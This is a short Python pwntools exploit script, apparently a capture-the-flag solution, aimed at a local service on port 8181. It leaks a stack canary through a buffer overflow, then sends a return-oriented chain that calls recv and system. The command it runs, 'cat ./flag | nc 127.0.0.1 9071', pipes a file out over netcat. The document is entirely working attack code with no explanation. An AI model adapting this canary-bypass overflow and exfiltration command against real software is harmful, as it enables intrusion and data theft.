from pwn import *
from time import *

s=remote('127.0.0.1',8181)

ppppr=0x08048EEC
recv_plt=0x080486E0
system_plt=0x08048620
bss=0x0804B1B4
canary=''
payload=''

cmd='cat ./flag | nc 127.0.0.1 9071'

print s.recvuntil('Select menu > ')
s.sendline('1')
print s.recvuntil('Input Your Message : ')
s.send('A'*41)
print s.recvuntil('A'*40)
leak=u32(s.recv(4))
canary=leak-ord('A')

print "canary: "+str(hex(canary))

print s.recvuntil('Select menu > ')
s.sendline('1')
print s.recvuntil('Input Your Message : ')
payload='A'*40
payload+=p32(canary)
payload+='B'*12 #sfp
payload+=p32(recv_plt)
payload+=p32(ppppr)
payload+=p32(4)
payload+=p32(bss)
payload+=p32(len(cmd))
payload+=p32(0)
payload+=p32(system_plt)
payload+='C'*4
payload+=p32(bss)
s.sendline(payload)

print s.recvuntil('Select menu > ')
s.sendline('3')
s.sendline(cmd)

s.interactive()
